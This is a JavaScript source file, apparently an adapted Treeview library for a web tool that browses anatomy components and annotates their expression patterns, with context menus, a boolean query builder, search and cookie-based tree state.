    var parObjId = (obj.parentElement) ? obj.parentElement.id : obj.parentNode.id;
    if(parObjId != 'ptnLcnNtMenu') {
    	var expMenu = document.getElementById('ptnLcnNtMenu');
    	expMenu.style.display = 'none';
    }
    
}
/**
 * function to open a popup window for annotation of a component
 * and hide the menu from which the window was opened from the user
 * @param expMenu - menu with open window functionality
 * @param windowName - the ane of the window
 * @param windowParams - the parameters of the window
 */
function openAnnotWindow(url, windowName, windowParams){
	var expMenu = document.getElementById('ptnLcnNtMenu');
    expMenu.style.display = 'none';
    var w=window.open(url,windowName,windowParams);
    w.focus(); 
}
/**
 * function to popup an annotation window when the user selects a certain comnponent with the right mouse button
 * @param e - mouse event
 */
function showAnnotationPopup(e) {
	if(!e) {
        e = event;
    }
    //get the id of the object that was clicked
    var objId = (e.target) ? e.target.id : event.srcElement.id;
    
    //if the id contains the string itemTextLink or folderIcon then the 
    // user has clicked a component and not any other element
    if(objId.indexOf('itemTextLink')>=0 || objId.indexOf('folderIcon')>=0) {
    	
    	var itemId;
    	//get the id of the component being clicked
    	if(objId.indexOf('itemTextLink')>=0) {
    		itemId = objId.substring('itemTextLink'.length);
    	}
    	else {
    		itemId = objId.substring('folderIcon'.length);
    	}
    	//remove all text from within the element 'ptnLcnNtMenu' - this 
    	// will contain the 'Add/Edit Pattern/Note Menut items
    	var expMenu = document.getElementById('ptnLcnNtMenu');
    	expMenu.innerHTML = "";
    	
    	//get the node object using the item id obtained above
    	var thisNode = findObj(itemId);
    	
    	//if the node object is found to be annotated as 'present'
    	if(thisNode.isAnnotDetected) {
    		//create list elements which will be inserted into 'ptnLcnNtMenu'		
    		var ptnLcnEl = document.createElement('li');
    		ptnLcnEl.setAttribute('id', 'ptnLcnItem');
    		ptnLcnEl.style.padding = "5px";
    		ptnLcnEl.style.cursor = "pointer";
    		ptnLcnEl.innerHTML = "Add/Edit Patterns and Locations";
    		expMenu.appendChild(ptnLcnEl);
    		
    		ptnLcnEl.onmouseover = changeMenuItemColor;
            ptnLcnEl.onmouseout = changeMenuItemColor;
            //add 'click' functionality to menu item
            ptnLcnEl.onclick = function openPtnLcnWindow() {
            	openAnnotWindow('ish_edit_pattern.html?submissionId='+SUBMISSION_ID+'&componentId='+thisNode.desc.substring(thisNode.desc.indexOf('(')+1,thisNode.desc.length-1), 'patternWindow', 'resizable=1,toolbar=0,scrollbars=1,width=500,height=650');
            }
	
    		var notesEl = document.createElement('li');
    		notesEl.setAttribute('id', 'notesItem');
    		notesEl.style.padding = "5px";
    		notesEl.style.cursor = "pointer";
    		notesEl.innerHTML = "Add/Edit Note";
    		expMenu.appendChild(notesEl);
            
            notesEl.onmouseover = changeMenuItemColor;
            notesEl.onmouseout = changeMenuItemColor;
            //add 'click' functionality to menu item
            notesEl.onclick = function openNotesWindow() {
            	openAnnotWindow('ish_edit_component_note.html?submissionId='+SUBMISSION_ID+'&componentId='+thisNode.desc.substring(thisNode.desc.indexOf('(')+1,thisNode.desc.length-1), 'notesWindow', 'resizable=1,toolbar=0,scrollbars=1,width=500,height=600');
            };
            //make the menu visible to the user
    		expMenu.style.display = 'block';
    		expMenu.style.visibility = 'visible';
    		
    		//position the menu so that it is next to the position the mouse was clicked from
    		if(e.pageX || e.pageY) {
                expMenu.style.left = e.pageX +5+"px";
                expMenu.style.top = e.pageY +5+"px";
            }
            else if (event.clientX || event.clientY) {
            	expMenu.style.left = event.clientX + document.documentElement.scrollLeft + document.body.scrollLeft +5+"px";
                expMenu.style.top = event.clientY + document.documentElement.scrollTop + document.body.scrollTop +5+"px";
            }	
    	}
    	//else if the node has annotation 'not detected' or 'possible/uncertain'
    	else if(thisNode.isAnnotNotPresent || thisNode.isAnnotPossible){
    		//create list elements which will be inserted into 'ptnLcnNtMenu'
    		var notesEl = document.createElement('li');
    		notesEl.setAttribute('id', 'notesItem');
    		notesEl.style.padding = "5px";
    		notesEl.style.cursor = "pointer";
    		notesEl.innerHTML = "Add/Edit Note";
    		expMenu.appendChild(notesEl);
            
            notesEl.onmouseover = changeMenuItemColor;
            notesEl.onmouseout = changeMenuItemColor;
            //add 'click' functionality to menu item
            notesEl.onclick = function openNotesWindow() {
            	openAnnotWindow('ish_edit_component_note.html?submissionId='+SUBMISSION_ID+'&componentId='+thisNode.desc.substring(thisNode.desc.indexOf('(')+1,thisNode.desc.length-1), 'notesWindow', 'resizable=1,toolbar=0,scrollbars=1,width=500,height=600');
            };
            //make the menu visible to the user
    		expMenu.style.display = 'block';
    		expMenu.style.visibility = 'visible';
    		
    		//position the menu so that it is next to the position the mouse was clicked from
    		if(e.pageX || e.pageY) {
                expMenu.style.left = e.pageX +5+"px";
                expMenu.style.top = e.pageY +5+"px";
            }
            else if (event.clientX || event.clientY) {
                expMenu.style.left = event.clientX + document.documentElement.scrollLeft + document.body.scrollLeft +5+"px";
                expMenu.style.top = event.clientY + document.documentElement.scrollTop + document.body.scrollTop +5+"px";
    	    } 
        }
    }    
    //return false so that native right click functionality is disabled!!
    return false;
}
/**
 * function to create a list of components used to submit to the server when user clicks the specific component
 * If the component has already been added to the list, it will be removed
 * @param id_to_display - the id which will be submitted to the server in order to query the db
 * @param text_to_display - the text which the user will see when they build their list of components
 * @param row - the row number of the component in the tree
 */
function showComponentID(id_to_display, text_to_display, row) {
    
    var components = document.getElementById('components');
    if(document.getElementById('comp'+row)) {
      singlecomp = document.getElementById('comp'+row);
      components.removeChild(singlecomp);
      numComps--;
    }
    else{
      components.innerHTML += '<div class="plaintextbold" id="comp'+row+'">'+text_to_display+'<input type="hidden" name="component" value="'+id_to_display+'" /></div>';
      numComps++;
    }
    
    queryForm = document.forms['anatomyTreeForm'];
    queryFormId = queryForm.id;
    submitbuttonId = queryFormId + ":submitbutton";
    submitButton = queryForm[submitbuttonId];
    
    
    if(numComps < 1) {
      submitButton.disabled = true;
    }
    else {
      submitButton.disabled = false;
    }
}
/**
 * function to create a list of components to submit to the server when user clicks the specific component
 * used to carry out multiple 'same' annotations on a submission
 * @param id_to_display - the id which will be submitted to the server in order to query the db
 * @param text-to_display - not used
 * @param row - the row number of the component in the tree
 */
function toggleComponent(id_to_display, text_to_display, row) {
	var componentsHolder = document.getElementById('components');
	if(document.getElementById('comp'+row)) {
		var singleComp = document.getElementById('comp'+row);
		componentsHolder.removeChild(singleComp);
	}
	else {
		componentsHolder.innerHTML +='<div id="comp'+row+'"><input type="hidden" name="component" value="'+id_to_display+'" /></div>'
	}
}

var enabled = 0; 
var maxEnabled = 3;
/**
 * function to add/remove components from the boolean query list
 * @param id_to_display - not used
 * @param text_to_display - the text which the user will see when they build their list of components
 * @param row - the row number of the component in the tree
 */
function toggleParamGroup(id_to_display, text_to_display, row) {
    
    var queryFormId = 'booleanQForm';
    var qForm = document.forms[queryFormId];
    var qForm2 = document.forms[queryFormId+'2'];
    
    
    if(document.getElementById('comp'+row)){
        
        var singlecomp = document.getElementById('comp'+row);
        var boolId = singlecomp.parentNode;
        
        boolId.removeChild(singlecomp);
        var boolValue = boolId.id.substring(4);
        boolValue = parseInt(boolValue);
        var subsequentComps = enabled - boolValue;
        
        if(subsequentComps > 0) {
            for(i=boolValue;i<boolValue+subsequentComps;i++) {
                var nextBoolId = document.getElementById('bool'+(i+1)); 
                var nextInnerHtml = nextBoolId.innerHTML;
                nextBoolId.innerHTML = "";
                var currBoolId = document.getElementById('bool'+i);
                currBoolId.innerHTML = nextInnerHtml;
            }
        }
        enabled--;
        toggleFields(true, qForm, queryFormId);
        if(enabled <= 0) {
          qForm2.elements[queryFormId+'2:submitQBuilder'].disabled = true;
          qForm2.elements[queryFormId+'2:saveQ'].disabled = true;
        }
        
    }
    else {
        if(enabled < maxEnabled) {
          var boolId = document.getElementById('bool'+(enabled+1));
          boolId.innerHTML = '<div class="plainred" id="comp'+row+'">'+text_to_display+'</div>';
          toggleFields(false, qForm, queryFormId);
          enabled++;
          qForm2.elements[queryFormId+'2:submitQBuilder'].disabled = false;
          qForm2.elements[queryFormId+'2:saveQ'].disabled = false;
        }
        
    }
    setQueryBuilderText();
    
}
/**
 * function to create content of text input for boolean query based on the content of the boolean query GUI
 */
function setQueryBuilderText() {

    var qForm = document.forms['booleanQForm'];
    var qForm2 = document.forms['booleanQForm2'];
    var qForm2Id = qForm2.id
    var qFormId = qForm.id;
    var qBuilderTxt = "";
    qBuilderTxt += document.getElementById(qFormId+':resultFormat').value +": "
    
    for(var i=0;i<enabled;i++){
      var expChecked = false;
      var annoTypesPar = document.getElementById(qFormId+':annotTypes'+(i+1));
      var myChildElements = annoTypesPar.getElementsByTagName("input");
      
      //for(var j=0;j<myChildElements.length;j++){
        //if(myChildElements[j].checked) {  
          expChecked = true;
        //}
      //}
      
      if(expChecked) {
      
        if(document.getElementById(qFormId+':operator'+i)) {
          if(!document.getElementById(qFormId+':operator'+i).disabled) {
            qBuilderTxt += " "+document.getElementById(qFormId+':operator'+i).value+" ";
          }
        }
        
        var numCheckedElements = 0;
        for(var j=0;j<myChildElements.length;j++){
          if(myChildElements[j].checked) {
            numCheckedElements++;
          }
        }
        
        if(numCheckedElements < 1)
          myChildElements[0].checked = true;
          
        numCheckedElements = 0;
        
        for(var j=0;j<myChildElements.length;j++){
         
          if(myChildElements[j].checked) {
          
            expChecked = true;
            if(numCheckedElements > 0)
              qBuilderTxt += "," + myChildElements[j].value
            else
              qBuilderTxt += myChildElements[j].value
            numCheckedElements++;
          }
        
        }
        
        var boolParam = document.getElementById(qFormId+':location'+(i+1));
        qBuilderTxt += "{"
        qBuilderTxt += boolParam.value +" "
        var boolId = document.getElementById('bool'+(i+1));
        myChildElements = boolId.getElementsByTagName("div");
        for(var j=0;j<myChildElements.length;j++){
          qBuilderTxt += ((j==0)?"\"":" ") + myChildElements[j].innerHTML;
        }
        qBuilderTxt += "\" ";
        boolParam = document.getElementById(qFormId+':startStage'+(i+1));
        qBuilderTxt += boolParam.value;
        qBuilderTxt += "..";
        boolParam = document.getElementById(qFormId+':endStage'+(i+1));
        qBuilderTxt += boolParam.value;
        boolParam = document.getElementById(qFormId+':pattern'+(i+1));
        if(boolParam.value != "")
          qBuilderTxt += " pt="+boolParam.value;
        boolParam = document.getElementById(qFormId+':locations'+(i+1));
        if(boolParam.value != "")
          qBuilderTxt += " lc="+boolParam.value;
        qBuilderTxt += "}";
      }
      
    }
    
    
    qForm2.elements[qForm2Id+':queryBuilder'].value = qBuilderTxt;
    
}

function toggleFields(bool, queryForm, qFormId) {
    
    if(queryForm.elements[qFormId+':operator'+enabled])
        queryForm.elements[qFormId+':operator'+enabled].disabled = bool;    
    

    var annoTypesPar = document.getElementById(qFormId+':annotTypes'+(enabled+1));
    var myChildElements = annoTypesPar.getElementsByTagName("input");
    for(i=0;i<myChildElements.length;i++){
        myChildElements[i].disabled = bool;
    }
    queryForm.elements[qFormId+':location'+(enabled+1)].disabled = bool;
    queryForm.elements[qFormId+':startStage'+(enabled+1)].disabled = bool;
    queryForm.elements[qFormId+':endStage'+(enabled+1)].disabled = bool;
    queryForm.elements[qFormId+':pattern'+(enabled+1)].disabled = bool;
    queryForm.elements[qFormId+':locations'+(enabled+1)].disabled = bool;
}

function checkButtonStatus() {
    
    var formId = 'booleanQForm2';
    var queryForm = document.forms[formId];
    var queryBuilder = queryForm.elements[formId+':queryBuilder'];
    var qbVal = queryBuilder.value;
    if(qbVal != null && qbVal != "") {
      queryForm.elements[formId+':submitQBuilder'].disabled = false;
      queryForm.elements[formId+':saveQ'].disabled = false;
    }
    else{
      queryForm.elements[formId+':submitQBuilder'].disabled = true;
      queryForm.elements[formId+':saveQ'].disabled = true;
    }
    
  
}

function ld  ()
{
	return document.links.length-1
}


// Auxiliary Functions
// *******************

function finalizeCreationOfChildDocs(folderObj) {
  for(i=0; i < folderObj.nChildren; i++)  {
    child = folderObj.children[i]
    if (typeof child[0] != 'undefined')
    {
      // Amazingly, arrays can have members, so   a = ["a", "b"]; a.desc="asdas"   works
      // If a doc was inserted as an array, we can transform it into an itemObj by adding
      // the missing members and functions
      child.desc = child[0]
      setItemLink(child, GLOBALTARGET, child[1])
      finalizeCreationOfItem(child)
    }
  }
}

function findObj(id)
{
  var i=0;
  var nodeObj;

  if (typeof foldersTree.xID != "undefined") {
    nodeObj = indexOfEntries[i];
    for(i=0;i<nEntries&&indexOfEntries[i].xID!=id;i++) //may need optimization
      ;
    id = i
  }
  if (id >= nEntries)
    return null; //example: node removed in DB
  else
    return indexOfEntries[id];
}

function isLinked(hrefText) {
    var result = true;
    result = (result && hrefText !=null);
    result = (result && hrefText != '');
    result = (result && hrefText.indexOf('undefined') < 0);
    result = (result && hrefText.indexOf('parent.op') < 0);
    return result;
}

// Do highlighting by changing background and foreg. colors of folder or doc text
function highlightObjLink(nodeObj) {
  if (!HIGHLIGHT || nodeObj==null || nodeObj.maySelect==false) {//node deleted in DB
    return;
  }
  

  if (browserVersion == 1 || browserVersion == 3) {
    var clickedDOMObj = getElById('itemTextLink'+nodeObj.id);
    if (clickedDOMObj != null) {
  
        if (lastClicked != null) {
            var prevClickedDOMObj = getElById('itemTextLink'+lastClicked.id);
            //prevClickedDOMObj.style.color=lastClickedColor;
            //prevClickedDOMObj.style.backgroundColor=lastClickedBgColor;
        }

        lastClickedColor    = clickedDOMObj.style.color;
        lastClickedBgColor  = clickedDOMObj.style.backgroundColor;        
        if (lastClickedBgColor != '' ) {
          clickedDOMObj.style.color='#5C5C5C';
          clickedDOMObj.style.backgroundColor='';
        }
        else {
          if(enabled < maxEnabled) { 
            clickedDOMObj.style.color=HIGHLIGHT_COLOR;
            clickedDOMObj.style.backgroundColor=HIGHLIGHT_BG;
          }
        }
    }
  }
  lastClicked = nodeObj;
  if (PRESERVESTATE)
    SetCookie('highlightedTreeviewLink', nodeObj.getID());
}
/**
 * creates a folder object and determines who the direct parent of the object is
 * @param parentFolder - the parent folder (see function gFld)
 * @param childFolder - the child folder (see function gFld)
 */
function insFld(parentFolder, childFolder)
{
	//add the child folder to the parents list of children
	theChild = parentFolder.addChild(childFolder)
	//check if the child has direct 'present' annotation
    checkDetectedAnnotation(theChild)
    //check if the child has direct 'uncertain' or 'possible' annotation
    checkPossibleAnnotation(theChild)
    return theChild
}
/**
 * creates an Item object (a leaf node) and determines who the direct parent of the object is
 * @param parentFolder - the parent folder (se function gFld)
 * @param document - the child object (see function gLnk)
 */
function insDoc(parentFolder, document)
{
  theChild = parentFolder.addChild(document)
  checkDetectedAnnotation(theChild)
  checkPossibleAnnotation(theChild)
  return theChild
}
/**
 * creates a folder object containing data on an anatomy component
 * @param description - description of the component e.g. name
 * @param hreference - function to be executed when component is clicked
 * @param group - is the component a group term or a group descendent
 * @param expression - type of expression on the component or not examined
 * @param strength - strength of expression
 * @param pattern - pattern of expresssion
 * @param note - if there is a note associated with the component
 */
function gFld(description, hreference, group, expression, strength, pattern, note)
{
  folder = new Folder(description, hreference, group, expression, strength, pattern, note);
  return folder;
}
/**
 * creates an Item object (a leaf node in the tree) containing data on an anatomy component
 * @param optionFlags - determines what happens when the component is 
 * clicked, e.g. open in nw window; same window etc
 * @param description - description of the component e.g. name
 * @param linkData - function to be executed when component is clicked
 * @param group - is the component a group term or a group descendent
 * @param expression - type of expression on the component or not examined
 * @param strength - strength of expression
 * @param pattern - pattern of expresssion
 * @param note - if there is a note associated with the component 
 */
function gLnk(optionFlags, description, linkData, group, expression, strength, pattern, note)
{
  if (optionFlags>=0) { //is numeric (old style) or empty (error)
    //Target changed from numeric to string in Aug 2002, and support for numeric style was entirely dropped in Mar 2004
    alert("Change your Treeview configuration file to use the new style of target argument in gLnk");
    return;
  }
  //create the item object
  newItem = new Item(description, group, expression, strength, pattern, note);
  setItemLink(newItem, optionFlags, linkData);
  return newItem;
}

function setItemLink(item, optionFlags, linkData) {
  var targetFlag = "";
  var target = "";
  var protocolFlag = "";
  var protocol = "";

  targetFlag = optionFlags.charAt(0)
  if (targetFlag=="B")
    target = "_blank"
  if (targetFlag=="P")
    target = "_parent"
  if (targetFlag=="R")
    target = "basefrm"
  if (targetFlag=="S")
    target = "_self"
  if (targetFlag=="T")
    target = "_top"

  if (optionFlags.length > 1) {
    protocolFlag = optionFlags.charAt(1)
    if (protocolFlag=="h")
      protocol = "http://"
    if (protocolFlag=="s")
      protocol = "https://"
    if (protocolFlag=="f")
      protocol = "ftp://"
    if (protocolFlag=="m")
      protocol = "mailto:"
  }

  item.link = protocol+linkData;
  item.target = target
}

//Function created  for backwards compatibility purposes
//Function contents voided in March 2004
function oldGLnk(target, description, linkData)
{
}

function preLoadIcons() {
	var auxImg
	auxImg = new Image();
	auxImg.src = ICONPATH + "ftv2vertline.gif";
	auxImg.src = ICONPATH + "ftv2mlastnode.gif";
	auxImg.src = ICONPATH + "ftv2mnode.gif";
	auxImg.src = ICONPATH + "ftv2plastnode.gif";
	auxImg.src = ICONPATH + "ftv2pnode.gif";
	auxImg.src = ICONPATH + "ftv2blank.gif";
	auxImg.src = ICONPATH + "ftv2lastnode.gif";
	auxImg.src = ICONPATH + "ftv2node.gif";
	auxImg.src = ICONPATH + "ftv2folderclosed.gif";
	auxImg.src = ICONPATH + "ftv2folderopen.gif";
	auxImg.src = ICONPATH + "ftv2doc.gif";
}

//Open some folders for initial layout, if necessary
function setInitialLayout() {
  if (browserVersion > 0 && !STARTALLOPEN) {
    clickOnNodeObj(foldersTree);
  }

  if (!STARTALLOPEN && (browserVersion > 0) && PRESERVESTATE){
    PersistentFolderOpening();
  }

  if (ANNOTATEDTREE)
    openAnnotatedNodes();

  if(!ANNOTATEDTREE && OPENATVISCERAL)
    openVisceralNode();
}

//Used with NS4 and STARTALLOPEN
function renderAllTree(nodeObj, parent) {
  var i=0;
  nodeObj.renderOb(parent)
  if (supportsDeferral)
    for (i=nodeObj.nChildren-1; i>=0; i--)
      renderAllTree(nodeObj.children[i], nodeObj.navObj)
  else
    for (i=0 ; i < nodeObj.nChildren; i++)
      renderAllTree(nodeObj.children[i], null)
}

function hideWholeTree(nodeObj, hideThisOne, nodeObjMove) {
  var i=0;
  var heightContained=0;
  var childrenMove=nodeObjMove;

  if (hideThisOne)
    nodeObj.escondeBlock()

  if (browserVersion == 2)
    nodeObj.navObj.moveBy(0, 0-nodeObjMove)

  for (i=0 ; i < nodeObj.nChildren; i++) {
    heightContainedInChild = hideWholeTree(nodeObj.children[i], true, childrenMove)
    if (browserVersion == 2) {
      heightContained = heightContained + heightContainedInChild + nodeObj.children[i].navObj.clip.height
      childrenMove = childrenMove + heightContainedInChild
	}
  }

  return heightContained;
}


// Simulating inserAdjacentHTML on NS6
// Code by thor@jscript.dk
// ******************************************

if(typeof HTMLElement!="undefined" && !HTMLElement.prototype.insertAdjacentElement){
	HTMLElement.prototype.insertAdjacentElement = function (where,parsedNode)
	{
		switch (where){
		case 'beforeBegin':
			this.parentNode.insertBefore(parsedNode,this)
			break;
		case 'afterBegin':
			this.insertBefore(parsedNode,this.firstChild);
			break;
		case 'beforeEnd':
			this.appendChild(parsedNode);
			break;
		case 'afterEnd':
			if (this.nextSibling)
				this.parentNode.insertBefore(parsedNode,this.nextSibling);
			else this.parentNode.appendChild(parsedNode);
			break;
		}
	}

	HTMLElement.prototype.insertAdjacentHTML = function(where,htmlStr)
	{
		var r = this.ownerDocument.createRange();
		r.setStartBefore(this);
		var parsedHTML = r.createContextualFragment(htmlStr);
		this.insertAdjacentElement(where,parsedHTML)
	}
}

function getElById(idVal) {
  if (document.getElementById != null)
    return document.getElementById(idVal)
  if (document.all != null)
    return document.all[idVal]

  alert("Problem getting element by id")
  return null
}

function openVisceralNode() {
  for(y=0;y<visceralNodes.length;y++) {
    idStr = visceralNodes[y];
    visceralNode = findObj(idStr)
    visceralNode.forceOpeningOfAncestorFolders()
    if(visceralNode.setState)
      clickOnNodeObj(visceralNode);
  }
}

// xingjun - 25/10/2010 - typo correction for the alert 'You input ...'
function openNodesMatchingSearchString(searchText, caseSensitive) {
  searchText = searchText.trim(); // added by xingjun - 03/08/2009
  
  if (searchText==null || searchText.length == 0) {		// Added by Mehran
  	alert('You should enter a value to search!');
  	return;
  }
  
  if (caseSensitive==null)
	  caseSensitive = true;
  var selectedItems = new Array();
  if(searchText != null && searchText != "") {
    //setInitialLayout();
    for(var i=0;i<indexOfEntries.length;i++) {
      var thisNode = indexOfEntries[i];
      if( caseSensitive && thisNode.desc.indexOf(searchText)>=0 || 
      	 !caseSensitive && thisNode.desc.toLowerCase().indexOf(searchText.toLowerCase())>=0 ) {
        thisNode.forceOpeningOfAncestorFolders();
        selectedItems[i] = 1;
      }
    }
  }
  if (selectedItems.length==0) {		// Added by Mehran
  	alert('Your input did not match any component.');
  	return;
  }
  
  var treeDiv = getElById('domRoot');
  var leaves = treeDiv.getElementsByTagName('a');
  var order = 0;
  for (var i=0; i<leaves.length; i++) 
    if (leaves[i].id.indexOf('itemTextLink') == 0) {
      var nodeId = leaves[i].id.substr(12);
      if (selectedItems[nodeId]) {
	leaves[i].style.color = "red";
	// make sure the first one is visible
	if (0 == order) {
	  order++;
	  // make it visible only if not
	  leaves[i].scrollIntoView(false);
	}
      } else
	leaves[i].style.color = "#5C5C5C";
    }
}

// trim the leading and trailing whitespace from the string
String.prototype.trim = function() {
	return this.replace(/^\s+|\s+$/g, ''); 
}

function openAnnotatedNodes()
{
  
//  showAnnoGps = GetCookie('displayOfAnnoGps');	// Commented by Mehran- instead of using cookies a parameter is passed to through initaliseDocument method

  for(p=0;p<idsWithAnnotPres.length;p++)
  {
    idStr = idsWithAnnotPres[p];
    openAnnoParents(idStr, showAnnoGps);
  }
  for(j=0;j<idsWithAnnotNotDet.length;j++)
  {
    idStr = idsWithAnnotNotDet[j];
    openAnnoParents(idStr, showAnnoGps);
  }
  for(q=0;q<idsWithAnnoPossible.length;q++)
  {
    idStr = idsWithAnnoPossible[q];
    openAnnoParents(idStr, showAnnoGps);
  }
  
}

// modified by xingjun - 11/02/2009
// components under group terms are required to display when the tree is firstly showed
function openAnnoParents(idStr, showAnnoGps) {
  curNodeObj = findObj(idStr)
//  if(!curNodeObj.isGroup || (showAnnoGps != null && showAnnoGps=="show")) {
  if(!curNodeObj.isGroup ||(showAnnoGps!=null && showAnnoGps=="show") || (showAnnoGps==null)) {
    if(curNodeObj != null && curNodeObj.id != foldersTree.id) {
      curNodeObj.forceOpeningOfAncestorFolders()
    }
  }
}

// Functions for cookies
// Note: THESE FUNCTIONS ARE OPTIONAL. No cookies are used unless
// the PRESERVESTATE variable is set to 1 (default 0)
// The separator currently in use is ^ (chr 94)
// ***********************************************************

function PersistentFolderOpening()
{
  var stateInCookie;
  var fldStr=""
  var fldArr
  var fldPos=0
  var id
  var nodeObj
  stateInCookie = GetCookie("clickedFolder");
  SetCookie('clickedFolder', "") //at the end of function it will be back, minus null cases

  if(stateInCookie!=null)
  {
    fldArr = stateInCookie.split(cookieCutter)
    for (fldPos=0; fldPos<fldArr.length; fldPos++)
    {
      fldStr=fldArr[fldPos]
      if (fldStr != "") {
        nodeObj = findObj(fldStr)
        if (nodeObj!=null) //may have been deleted
          if (nodeObj.setState) {
            nodeObj.forceOpeningOfAncestorFolders()
            clickOnNodeObj(nodeObj);
          }
          else
            alert("Internal id is not pointing to a folder anymore.\nConsider giving an ID to the tree and external IDs to the individual nodes.")
      }
    }
  }
}

function storeAllNodesInClickCookie(treeNodeObj)
{
  var currentOpen
  var i = 0

  if (typeof treeNodeObj.setState != "undefined") //is folder
  {
    currentOpen = GetCookie("clickedFolder")
    if (currentOpen == null)
      currentOpen = ""

    if (treeNodeObj.getID() != foldersTree.getID())
      SetCookie("clickedFolder", currentOpen+treeNodeObj.getID()+cookieCutter)

    for (i=0; i < treeNodeObj.nChildren; i++)
        storeAllNodesInClickCookie(treeNodeObj.children[i])
  }
}

function CookieBranding(name) {
  if (typeof foldersTree.treeID != "undefined")
    return name+foldersTree.treeID //needed for multi-tree sites. make sure treeId does not contain cookieCutter
  else
    return name
}

function GetCookie(name)
{
  name = CookieBranding(name)

	var arg = name + "=";
	var alen = arg.length;
	var clen = document.cookie.length;
	var i = 0;

	while (i < clen) {
		var j = i + alen;
		if (document.cookie.substring(i, j) == arg)
			return getCookieVal (j);
		i = document.cookie.indexOf(" ", i) + 1;
		if (i == 0) break;
	}
	return null;
}

function getCookieVal(offset) {
	var endstr = document.cookie.indexOf (";", offset);
	if (endstr == -1)
	endstr = document.cookie.length;
	return unescape(document.cookie.substring(offset, endstr));
}

function SetCookie(name, value)
{
	var argv = SetCookie.arguments;
	var argc = SetCookie.arguments.length;
	var expires = (argc > 2) ? argv[2] : null;
	//var path = (argc > 3) ? argv[3] : null;
	var domain = (argc > 4) ? argv[4] : null;
	var secure = (argc > 5) ? argv[5] : false;
	var path = "/"; //allows the tree to remain open across pages with diff names & paths

  name = CookieBranding(name)

	document.cookie = name + "=" + escape (value) +
	((expires == null) ? "" : ("; expires=" + expires.toGMTString())) +
	((path == null) ? "" : ("; path=" + path)) +
	((domain == null) ? "" : ("; domain=" + domain)) +
	((secure == true) ? "; secure" : "");
}

function ExpireCookie (name)
{
	var exp = new Date();
	exp.setTime (exp.getTime() - 1);
	var cval = GetCookie (name);
  name = CookieBranding(name)
	document.cookie = name + "=" + cval + "; expires=" + exp.toGMTString();
}


//To customize the tree, overwrite these variables in the configuration file (demoFramesetNode.js, etc.)

var USETEXTLINKS = 0;
var STARTALLOPEN = 0;
var USEFRAMES = 1;
var USEICONS = 1;
var WRAPTEXT = 0;
var PERSERVESTATE = 0; //backward compatibility
var PRESERVESTATE = 0;
var ICONPATH = '../images/tree/';
var HIGHLIGHT = 0;
var HIGHLIGHT_COLOR = 'black';
var HIGHLIGHT_BG    = '#E6E8FA';
var BUILDALL = 0;
var GLOBALTARGET = "R"; // variable only applicable for addChildren uses
var DISPLAYONLY = 1;
var OPENATVISCERAL = 0;
var ANNOTATEDTREE = 0;
var SUBMISSION_ID = "";
var ANNOTATABLE = 0;

//Other variables
var lastClicked = null;
var lastClickedColor;
var lastClickedBgColor;
var indexOfEntries = new Array
var nEntries = 0
var idsWithAnnotPres = new Array
var nAnnoPresEntries = 0
var idsWithAnnotNotDet = new Array
var nAnnoNoDetEntries = 0
var visceralNodes = new Array
var idsWithAnnoPossible = new Array
var nAnnoPossibleEntries = 0
var numVisceralNodes = 0
var browserVersion = 0
var selectedFolder=0
var lastOpenedFolder=null
var t=5
var doc = document
var supportsDeferral = false
var cookieCutter = '^' //You can change this if you need to use ^ in your xID or treeID values

doc.yPos = 0

function changeMenuItemColor(e) {
    if(!e) {
        e = event;
    }
    
    var obj = (e.target) ? e.target : event.srcElement;
        
        if(obj.style.backgroundColor == 'white' || obj.style.backgroundColor == '')
            obj.style.backgroundColor = '#E6E8FA';
        else
            obj.style.backgroundColor = 'white';   
}

// Main function
// *************

// This function uses an object (navigator) defined in
// ua.js, imported in the main html page (left frame).
function initializeDocument(displayAnnotations)
{	
	if (displayAnnotations)		// Added by Mehran - 15/7/09 to avoid using cookies for this parameter
	  	showAnnoGps = displayAnnotations;	
	  else 
		showAnnoGps = GetCookie('displayOfAnnoGps');	

	//if this tree instance is to be used for annotation then add the two functions below to the page
	if(ANNOTATABLE){
		document.body.oncontextmenu=showAnnotationPopup
		document.body.onclick = hideAnnotationPopup;
	}
	
	
  //creates array of the images used by the application
  preLoadIcons();
  switch(navigator.family)
  {
    case 'ie4':
      browserVersion = 1 //Simply means IE > 3.x
      break;
    case 'opera':
      browserVersion = (navigator.version > 6 ? 1 : 0); //opera7 has a good DOM
      break;
    case 'nn4':
      browserVersion = 2 //NS4.x
      break;
    case 'gecko':
      browserVersion = 3 //NS6.x
      break;
    case 'safari':
      browserVersion = 1 //Safari Beta 3 seems to behave like IE in spite of being based on Konkeror
      break;
	default:
      browserVersion = 0 //other, possibly without DHTML
      break;
  }

  // backward compatibility
  if (PERSERVESTATE)
    PRESERVESTATE = 1;

  if(ANNOTATEDTREE)
    OPENATVISCERAL = 0;

  supportsDeferral = ((navigator.family=='ie4' && navigator.version >= 5 && navigator.OS != "mac") || browserVersion == 3);
  supportsDeferral = supportsDeferral & (!BUILDALL)
  if (!USEFRAMES && browserVersion == 2)
  	browserVersion = 0;
  eval(String.fromCharCode(116,61,108,100,40,41))

  //If PRESERVESTATE is on, STARTALLOPEN can only be effective the first time the page
  //loads during the session. For subsequent (re)loads the PRESERVESTATE data stored
  //in cookies takes over the control of the initial expand/collapse
  if (PRESERVESTATE && GetCookie("clickedFolder") != null)
    STARTALLOPEN = 0

  //foldersTree (with the site's data) is created in an external .js (demoFramesetNode.js, for example)
  foldersTree.initialize(0, true, "")
  if (supportsDeferral && !STARTALLOPEN) {
      foldersTree.renderOb(null) //delay construction of nodes
  }

  else {
    renderAllTree(foldersTree, null);

    if (PRESERVESTATE && STARTALLOPEN)
      storeAllNodesInClickCookie(foldersTree)

    //To force the scrollable area to be big enough
    if (browserVersion == 2)
      doc.write("<layer top=" + indexOfEntries[nEntries-1].navObj.top + ">&nbsp;</layer>")

    if (browserVersion != 0 && !STARTALLOPEN)
      hideWholeTree(foldersTree, false, 0)
  }

  setInitialLayout()

  if (PRESERVESTATE && GetCookie('highlightedTreeviewLink')!=null  && GetCookie('highlightedTreeviewLink')!="") {
    var nodeObj = findObj(GetCookie('highlightedTreeviewLink'))
    if (nodeObj!=null){
      nodeObj.forceOpeningOfAncestorFolders()
      //highlightObjLink(nodeObj);
    }
    else
      SetCookie('highlightedTreeviewLink', '')
  }
}

/**
 * function to open a popup window for a Microarray cell
 * and show details of the component and probe
 */
function showMicroarrayDetails(name, component, value, row) {
	  var w = window.open('microarray_details.html?name='+ name + '&component='+ component + '&value='+ value + '&row='+ row,'microarrayPopup','resizable=1,toolbar=0,scrollbars=1,width=500,height=350');
	  w.focus();
	}

